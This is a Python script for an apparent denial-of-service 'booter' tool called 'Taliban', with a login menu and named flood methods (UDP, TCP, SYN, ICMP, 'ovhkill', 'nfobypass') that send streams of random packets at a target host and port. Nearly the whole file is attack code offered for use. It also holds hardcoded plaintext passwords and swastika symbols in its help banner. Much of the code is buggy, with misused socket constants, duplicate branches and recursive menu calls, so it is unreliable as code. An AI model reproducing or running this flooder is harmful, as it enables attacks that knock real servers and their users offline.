#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os

methods = """\033[91m
                                  ╦ ╦╔═╗╔╦╗╔═╗
                                  ╠═╣║ ║║║║║╣
                                  ╩ ╩╚═╝╩ ╩╚═╝𝑥𝑣
╔═══════════════════════════════════════════════════════════════════════════════╗
          𝒪𝒱ℋ                         ℋ𝒪ℳℰ                         𝓝𝓕𝓞                               
╚═══════════════════════════════════════════════════════════════════════════════╝
║       ovhkillV1        ║ ║           UDP          ║ ║         nfobypass       ║                                                   
║       ovhkillV2        ║ ║           TCP          ║ ║         nfodrop         ║                           
║       ovhbypass        ║ ║        TCPFLOOD        ║ ║         nfoDEMO         ║                   
║       ovhdrop          ║ ║        TCPTRI          ║ ║         DEMOv2          ║           
║       ovhdown          ║ ║          MDNS          ║ ║                         ║
║       ovhCRY           ║ ║                        ║ ║                         ║
║                        ║ ║                        ║ ║                         ║
║                        ║ ║                        ║ ║                         ║
╚════════════════════════╝ ╚════════════════════════╝ ╚═════════════════════════╝
"""

info = """\033[91m
                          ╦┌┐┌┌─┐┌─┐
                          ║│││├┤ │ │
                          ╩┘└┘└  └─┘𝑥𝑣
   ╔════════════════════════════════════════════════════╗
   ║[+] Taliban Was Made By ovh zode                    ║ 
   ║[+] Discord:zode#0001                               ║            
   ║[+] Instagram:ovh_zode                              ║
   ╚════════════════════════════════════════════════════╝       

"""

extras = """\033[91m
                                 ╔═╗╔═╗╔═╗╔═╗╔═╗
                                 ╚═╗╠═╝║ ║║ ║╠╣
                                 ╚═╝╩  ╚═╝╚═╝╚𝑥𝑣
  ╔═══════════════════════════════════════════════════════════════════════════════╗
  ║                 SPOOF YOUR IP: (IPV4)  (PORT)  (CITY)  (STATE)                ║               
  ╚═══════════════════════════════════════════════════════════════════════════════╝
"""

help = """\033[91m
                               ╦ ╦╔═╗╦  ╔═╗  ╔╦╗╔═╗╔╗╔╦ ╦
                               ╠═╣║╣ ║  ╠═╝  ║║║║╣ ║║║║ ║
                               ╩ ╩╚═╝╩═╝╩    ╩ ╩╚═╝╝╚╝╚═╝𝑥𝑣
       ╔═══════════════════════════════════════════════════════════════════╗
       ║  卐                                                           卐  ║ 
       ║  卐           These are all of the commands you might         卐  ║                         
       ║  卐                    need to get around!!!                  卐  ║                      
       ║  卐                                                           卐  ║
       ║  卐                                                           卐  ║ 
       ║  卐                         help                              卐  ║
       ║  卐                         updates                           卐  ║       
       ║  卐                         extras                            卐  ║      
       ║  卐                         Info                              卐  ║	
       ║  卐                         methods                           卐  ║                              
       ║  卐                         exit                              卐  ║
       ║  卐                                                           卐  ║
       ║  卐                                                           卐  ║
       ╚═══════════════════════════════════════════════════════════════════╝

"""

updates = """\033[91m
╔══════════════════════════════════════════════════════╗
║                     Update Notes                     ║
║══════════════════════════════════════════════════════╝
║[+] Timeout Bug Fixed  ║
║[+] Took Out Some Tools╚═══════════╗
║[+] User And Pass Changed To Reaper╚════════════╗ 
║[+] To Be A Guest Type "Guest" For User And Pass║
║[+] All Tools Fixed And Working         ╔═══════╝
╚════════════════════════════════════════╝
"""

banner = """
                   
      ▄▄▄▄▄ ▄▄▄· ▄▄▌  ▪  ▄▄▄▄·  ▄▄▄·  ▐ ▄ ·▄▄▄▄
      •██  ▐█ ▀█ ██•  ██ ▐█ ▀█▪▐█ ▀█ •█▌▐███▪ ██
       ▐█.▪▄█▀▀█ ██▪  ▐█·▐█▀▀█▄▄█▀▀█ ▐█▐▐▌▐█· ▐█▌
       ▐█▌·▐█ ▪▐▌▐█▌▐▌▐█▌██▄▪▐█▐█ ▪▐▌██▐█▌██. ██
       ▀▀▀  ▀  ▀ .▀▀▀ ▀▀▀·▀▀▀▀  ▀  ▀ ▀▀ █▪▀▀▀▀▀• 

       💔😈        Welcome To Taliban          😈💔
   ╔════════════════════════════════════════════════════╗
   ║ - - - - - Welcome To Taliban v1- - - - - - - - - - ║
   ║ - - - - - - - - - - - -Made By ovh zode  - - - - - ║
   ╚════════════════════════════════════════════════════╝
          ╔═══════╦═══════════════════════╦═══════╗
          ║ - - - ║    𝙆𝙖𝙢𝙞𝙠𝙖𝙯𝙚𝘽𝙤𝙢𝙗𝙚𝙧     ║ - - - ║ 
          ╚═══════╩═══════════════════════╩═══════╝ 
"""
cookie = open(".Taliban_Cookie","w+")
fsubs = 0 
liips = 0
tattacks = 0
uaid = 0
said = 0
iaid = 0
haid = 0
aid = 0
attack = True
http = True
udp = True
syn = True
icmp = True


def synsender(host, port, timer, punch):
	global said
	global syn
	global aid
	global tattacks
	timeout = time.time() + float(timer)
	sock = socket.socket (socket.AF_INET, socket.SOCK_RAW, socket.TCP_SYNCNT)

	said += 1
	tattacks += 1
	aid += 1
	while time.time() < timeout and syn and attack:
		sock.sendto(punch, (host, int(port)))
	said -= 1
	aid -= 1

def udpsender(host, port, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 1
	aid -= 1
def ovhkillv1sender(host, port, timer, punch):
	global uaid
	global udp
	global aid

	global tattacks



	timeout = time.time() + float(timer)

	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

	

	uaid += 1

	aid += 1

	tattacks += 1

	while time.time() < timeout and udp and attack:

		sock.sendto(punch, (host, int(port)))

	uaid -= 1

	aid -= 1



def ovhkillv2sender(host, port, timer, punch):

	global uaid

	global udp

	global aid

	global tattacks



	timeout = time.time() + float(timer)

	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

	

	uaid += 1

	aid += 1

	tattacks += 1

	while time.time() < timeout and udp and attack:

		sock.sendto(punch, (host, int(port)))

	uaid -= 1

	aid -= 1



def ovhbypasssender(host, port, timer, punch):

	global uaid

	global udp

	global aid

	global tattacks



	timeout = time.time() + float(timer)

	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

	

	uaid += 1

	aid += 1

	tattacks += 1

	while time.time() < timeout and udp and attack:

		sock.sendto(punch, (host, int(port)))

	uaid -= 1

	aid -= 1

	

def ovhdropsender(host, port, timer, punch):

	global uaid

	global udp

	global aid

	global tattacks



	timeout = time.time() + float(timer)

	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

	

	uaid += 1

	aid += 1

	tattacks += 1

	while time.time() < timeout and udp and attack:

		sock.sendto(punch, (host, int(port)))

	uaid -= 1

	aid -= 1

	

def ovhdownsender(host, port, timer, punch):

	global uaid

	global udp

	global aid

	global tattacks



	timeout = time.time() + float(timer)

	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

	

	uaid += 1

	aid += 1

	tattacks += 1

	while time.time() < timeout and udp and attack:

		sock.sendto(punch, (host, int(port)))

	uaid -= 1

	aid -= 1

def ovhCRYsender(host, port, timer, punch):

	global uaid

	global udp

	global aid

	global tattacks



	timeout = time.time() + float(timer)

	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

	

	uaid += 1

	aid += 1

	tattacks += 1

	while time.time() < timeout and udp and attack:

		sock.sendto(punch, (host, int(port)))

	uaid -= 1

	aid -= 1

	

def TCPsender(host, port, timer, punch):

	global uaid

	global udp

	global aid

	global tattacks



	timeout = time.time() + float(timer)

	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

	

	uaid += 1

	aid += 1

	tattacks += 1

	while time.time() < timeout and udp and attack:

		sock.sendto(punch, (host, int(port)))

	uaid -= 1

	aid -= 1

def TCPFLOODsender(host, port, timer, punch):

	global uaid

	global udp

	global aid

	global tattacks



	timeout = time.time() + float(timer)

	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

	

	uaid += 1

	aid += 1

	tattacks += 1

	while time.time() < timeout and udp and attack:

		sock.sendto(punch, (host, int(port)))

	uaid -= 1

	aid -= 1

	

def icmpsender(host, port, timer, punch):

	global iaid

	global icmp

	global aid

	global tattacks



	timeout = time.time() + float(timer)

	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)



	iaid += 1

	aid += 1

	tattacks += 1

	while time.time() < timeout and icmp and attack:

		sock.sendto(punch, (host, int(port)))

	iaid -= 1

	aid -= 1

def TCPTRIsender(host, port, timer, punch):

	global iaid

	global icmp

	global aid

	global tattacks



	timeout = time.time() + float(timer)

	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)



	iaid += 1

	aid += 1

	tattacks += 1

	while time.time() < timeout and icmp and attack:

		sock.sendto(punch, (host, int(port)))

	iaid -= 1

	aid -= 1

def MDNSsender(host, port, timer, punch):

	global iaid

	global icmp

	global aid

	global tattacks



	timeout = time.time() + float(timer)

	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)



	iaid += 1

	aid += 1

	tattacks += 1

	while time.time() < timeout and icmp and attack:

		sock.sendto(punch, (host, int(port)))

	iaid -= 1

	aid -= 1



def LDAPsender(host, port, timer, punch):

	global iaid

	global icmp

	global aid

	global tattacks



	timeout = time.time() + float(timer)

	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)



	iaid += 1

	aid += 1

	tattacks += 1

	while time.time() < timeout and icmp and attack:

		sock.sendto(punch, (host, int(port)))

	iaid -= 1

	aid -= 1



def nfobypasssender(host, port, timer, punch):

	global iaid

	global icmp

	global aid

	global tattacks



	timeout = time.time() + float(timer)

	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)



	iaid += 1

	aid += 1

	tattacks += 1

	while time.time() < timeout and icmp and attack:

		sock.sendto(punch, (host, int(port)))

	iaid -= 1

	aid -= 1



def nfodropsender(host, port, timer, punch):

	global iaid

	global icmp

	global aid

	global tattacks



	timeout = time.time() + float(timer)

	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)



	iaid += 1

	aid += 1

	tattacks += 1

	while time.time() < timeout and icmp and attack:

		sock.sendto(punch, (host, int(port)))

	iaid -= 1

	aid -= 1



def nfoDEMOsender(host, port, timer, punch):

	global iaid

	global icmp

	global aid

	global tattacks



	timeout = time.time() + float(timer)

	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)



	iaid += 1

	aid += 1

	tattacks += 1

	while time.time() < timeout and icmp and attack:

		sock.sendto(punch, (host, int(port)))

	iaid -= 1

	aid -= 1

	

def DEMOv2sender(host, port, timer, punch):

	global iaid

	global icmp

	global aid

	global tattacks



	timeout = time.time() + float(timer)

	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)



	iaid += 1

	aid += 1

	tattacks += 1

	while time.time() < timeout and icmp and attack:

		sock.sendto(punch, (host, int(port)))

	iaid -= 1

	aid -= 1



def httpsender(host, port, timer, punch):

	global haid

	global http

	global aid

	global tattacks



	timeout = time.time() + float(timer)



	haid += 1

	aid += 1

	tattacks += 1

	while time.time() < timeout and icmp and attack:

		try:

			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

			sock.sendto(punch, (host, int(port)))

			sock.close()

		except socket.error:

			pass



	haid -= 1

	aid -= 1

	



def main():

	global fsubs

	global liips

	global tattacks

	global uaid

	global said

	global iaid

	global haid

	global aid

	global attack

	global dp

	global syn

	global icmp

	global http



	while True:

		sys.stdout.write("\x1b]2;priority\x07")

		sin = input("\033[1;00m[\033[91mTaliban\033[1;00m] ").lower()

		sinput = sin.split(" ")[0]

		if sinput == "home":

			os.system ("clear")

			print (banner)

			main()

		elif sinput == "banner":

			os.system ("clear")

			Print (banner)

			main()

		elif sinput == "help":

			os.system ("clear")

			print (help)

			main()

		elif sinput == "extras":

			os.system ("clear")

			print (extras)

			main()

		elif sinput == "exit":

			os.system ("clear")

			print ("[\033[91mTaliban\033[00m] You Are Exiting Out Of Taliban.\n")

			exit()

		elif sinput == "methods":

			os.system ("clear")

			print (methods)

			main()

		elif sinput == "updates":

			os.system ("clear")

			print (updates)

			main()

		elif sinput == "info":

			os.system ("clear")

			print (info)

			main()

		elif sinput == "attacks":

			os.system ("clear")

			print ("[\033[91Taliban\033[00m] Total Attacks Running: {}\n".format (aid))

			main()

		elif sinput == "resolve":

			os.system ("clear")

			liips += 1

			host = sin.split(" ")[1]

			host_ip = socket.gethostbyname(host)

			print ("[\033[91mReaper\033[00m] Host: {} \033[00m[\033[91mConverted\033[00m] {}\n".format (host, host_ip))

			main()

		elif sinput == "udp":

				try:

					sinput, host, port, timer, pack = sin.split(" ")

					socket.gethostbyname(host)

					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))

					punch = random._urandom(int(pack))

					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()

				except ValueError:

					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))

					main()

				except socket.gaierror:

					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))

					main()

		elif sinput == "ovhkillv1":

				try:

					sinput, host, port, timer, pack = sin.split(" ")

					socket.gethostbyname(host)

					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))

					punch = random._urandom(int(pack))

					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()

				except ValueError:

					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))

					main()

				except socket.gaierror:

					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))

					main()

		elif sinput == "ovhkillv2":

			if username == "walker":

				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")

				main()    
			else:

				try:

					sinput, host, port, timer, pack = sin.split(" ")

					socket.gethostbyname(host)

					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))

					punch = random._urandom(int(pack))

					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()

				except ValueError:

					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))

					main()

				except socket.gaierror:

					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))

					main()

		elif sinput == "ovhbypass":

				try:

					sinput, host, port, timer, pack = sin.split(" ")

					socket.gethostbyname(host)

					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))

					punch = random._urandom(int(pack))

					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()

				except ValueError:

					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))

					main()

				except socket.gaierror:

					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))

					main()

		elif sinput == "ovhdrop":

			if username == "walker":

				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")

				main()

			else:

				try:

					sinput, host, port, timer, pack = sin.split(" ")

					socket.gethostbyname(host)

					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))

					punch = random._urandom(int(pack))

					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()

				except ValueError:

					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))

					main()

				except socket.gaierror:

					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))

					main()

		elif sinput == "mdns":

				try:

					sinput, host, port, timer, pack = sin.split(" ")

					socket.gethostbyname(host)

					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))

					punch = random._urandom(int(pack))

					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()

				except ValueError:

					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))

					main()

				except socket.gaierror:

					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))

					main()

		elif sinput == "ovhdown":

			if username == "walker":

				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")

				main()

			else:

				try:

					sinput, host, port, timer, pack = sin.split(" ")

					socket.gethostbyname(host)

					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))

					punch = random._urandom(int(pack))

					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()

				except ValueError:

					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))

					main()

				except socket.gaierror:

					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))

					main()

		elif sinput == "ovhcry":

			if username == "walker":

				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")

				main()

			else:

				try:

					sinput, host, port, timer, pack = sin.split(" ")

					socket.gethostbyname(host)

					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))

					punch = random._urandom(int(pack))

					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()

				except ValueError:

					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))

					main()

				except socket.gaierror:

					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))

					main()

		elif sinput == "UDP":

				try:

					sinput, host, port, timer, pack = sin.split(" ")

					socket.gethostbyname(host)

					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))

					punch = random._urandom(int(pack))

					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()

				except ValueError:

					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))

					main()

				except socket.gaierror:

					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))

					main()

		elif sinput == "tcp":

				try:

					sinput, host, port, timer, pack = sin.split(" ")

					socket.gethostbyname(host)

					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))

					punch = random._urandom(int(pack))

					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()

				except ValueError:

					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))

					main()

				except socket.gaierror:

					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))

					main()

		elif sinput == "tcpflood":

			if username == "walker":

				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")

				main()

			else:

				try:

					sinput, host, port, timer, pack = sin.split(" ")

					socket.gethostbyname(host)

					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))

					punch = random._urandom(int(pack))

					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()

				except ValueError:

					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))

					main()

				except socket.gaierror:

					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))

					main()

		elif sinput == "tcptri":

			if username == "walker":

				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")

				main()

			else:

				try:

					sinput, host, port, timer, pack = sin.split(" ")

					socket.gethostbyname(host)

					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))

					punch = random._urandom(int(pack))

					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()

				except ValueError:

					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))

					main()

				except socket.gaierror:

					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))

					main()

		elif sinput == "tcptri":

			if username == "Guest":

				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")

				main()

			else:

				try:

					sinput, host, port, timer, pack = sin.split(" ")

					socket.gethostbyname(host)

					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))

					punch = random._urandom(int(pack))

					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()

				except ValueError:

					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))

					main()

				except socket.gaierror:

					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))

					main()

		elif sinput == "ldap":

				try:

					sinput, host, port, timer, pack = sin.split(" ")

					socket.gethostbyname(host)

					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))

					punch = random._urandom(int(pack))

					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()

				except ValueError:

					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))

					main()

				except socket.gaierror:

					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))

					main()

		elif sinput == "nfobypass":

			if username == "walker":

				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")

				main()

			else:

				try:

					sinput, host, port, timer, pack = sin.split(" ")

					socket.gethostbyname(host)

					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))

					punch = random._urandom(int(pack))

					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()

				except ValueError:

					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))

					main()

				except socket.gaierror:

					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))

					main()

		elif sinput == "nfodrop":

			if username == "walker":

				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")

				main()

			else:

				try:

					sinput, host, port, timer, pack = sin.split(" ")

					socket.gethostbyname(host)

					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))

					punch = random._urandom(int(pack))

					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()

				except ValueError:

					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))

					main()

				except socket.gaierror:

					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))

					main()

		elif sinput == "nfodemo":

			if username == "Guest":

				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")

				main()

			else:

				try:

					sinput, host, port, timer, pack = sin.split(" ")

					socket.gethostbyname(host)

					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))

					punch = random._urandom(int(pack))

					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()

				except ValueError:

					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))

					main()

				except socket.gaierror:

					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))

					main()

		elif sinput == "demov2":

				try:

					sinput, host, port, timer, pack = sin.split(" ")

					socket.gethostbyname(host)

					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))

					punch = random._urandom(int(pack))

					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()

				except ValueError:

					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))

					main()

				except socket.gaierror:

					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))

					main()

		elif sinput == "ldap":

				try:

					sinput, host, port, timer, pack = sin.split(" ")

					socket.gethostbyname(host)

					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))

					punch = random._urandom(int(pack))

					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()

				except ValueError:

					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))

					main()

				except socket.gaierror:

					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))

					main()

		elif sinput == "nfobypass":

			if username == "walker":

				print ("[\033[91mAurora\033[00m] You Are Not Allowed To Use This Method.\n")

				main()

			else:

				try:

					sinput, host, port, timer, pack = sin.split(" ")

					socket.gethostbyname(host)

					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))

					punch = random._urandom(int(pack))

					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()

				except ValueError:

					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))

					main()

				except socket.gaierror:

					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))

					main()

		elif sinput == "icmp":

			if username == "Guest":

				print ("[\033[91mReaper\033[00m] You Are Not Allowed To Use This Method.\n")

				main()

			else:

				try:

					sinput, host, port, timer, pack = sin.split(" ")

					socket.gethostbyname(host)

					print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))

					punch = random._urandom(int(pack))

					threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()

				except ValueError:

					print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))

					main()

				except socket.gaierror:

					print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))

					main()

		elif sinput == "syn":

			try:

				sinput, host, port, timer, pack = sin.split(" ")

				socket.gethostbyname(host)

				print ("[\033[91mReaper\033[00m] Attack Sent To: {}\n".format (host))

				punch = random._urandom(int(pack))

				threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()

			except ValueError:

				print ("[\033[91mReaper\033[00m] The Command {} Requires An Argument.\n".format (sinput))

				main()

			except socket.gaierror:

				print ("[\033[91mReaper\033[00m] Host: {} Invalid.\n".format (host))

				main()

		elif sinput == "stop":

			print ("[\033[91mReaper\033[00m] All Running Attacks Have Been Stopped.\n")

			attack = False

			while not attack:

				if aid == 0:

					attack = True

		elif sinput == "stop":

			what = sin.split(" ")[1]

			if what == "udp":

				print ("Stopping All UDP Attacks.\n")

				udp = False

				while not udp:

					if aid == 0:

						print ("[\033[91mReaper\033[00m] No UDP Processes Running.")

						udp = True

						main()

			if what == "icmp":

				print ("Stopping All ICMP Attacks.\n")

				icmp = False

				while not icmp:

					print ("[\033[91mReaper\033[00m] No ICMP Processes Running.")

					udp = True

					main()

		else:

			print ("[\033[91mReaper\033[00m] {} Is Not A Command.\n".format(sinput))

			main()



try:
	users = ["Reaper", "Guest", "zode", "mort", "walker"]
	clear = "clear"
	os.system (clear)
	username = getpass.getpass ("[+] Username: ")
	if username in users:
		user = username
	else:
		print ("[+] Incorrect, Exiting.\n")
		exit()
except KeyboardInterrupt:
	exit()
try:
	passwords = ["Reaper", "Guest", "zode", "mort", "walker"]
	password = getpass.getpass ("[+] Password: ")
	if user == "Reaper":
		if password == passwords[0]:
			print ("[+] Login Correct.")
			print ("[+] Please wait.")
			cookie.write("DIE")
			time.sleep(3)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91mReaper\033[00m] Ctrl-C Has Been Pressed.\n")
				main()
		else:
			print ("[+] Incorrect, Exiting.\n")
			exit()
	if user == "zode":
			print ("[+] Login Correct.")
			print ("[+] Please wait.")
			cookie.write("DIE")
			time.sleep(3)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91mzode\033[00m] Ctrl-C Has Been Pressed.\n")
				main()
	elif user == "mort":
			print ("[+] Login Correct.")
			print ("[+] Please wait.")
			cookie.write("DIE")
			time.sleep(3)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91mReaper\033[00m] Ctrl-C Has Been Pressed.\n")
				main()
	if user == "walker":
		if password == passwords[4]:
			print ("[+] Login Correct.")
			print ("[+] Certain Methods Will Not Be Available To You.")
			print ("[+] Please Wait.")
			time.sleep(5)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91mReaper\033[00m] Ctrl-C Has Been Pressed.\n")
				main()
		else:
			print ("[+] Incorrect, Exiting.\n")
			exit()
except KeyboardInterrupt:
	exit()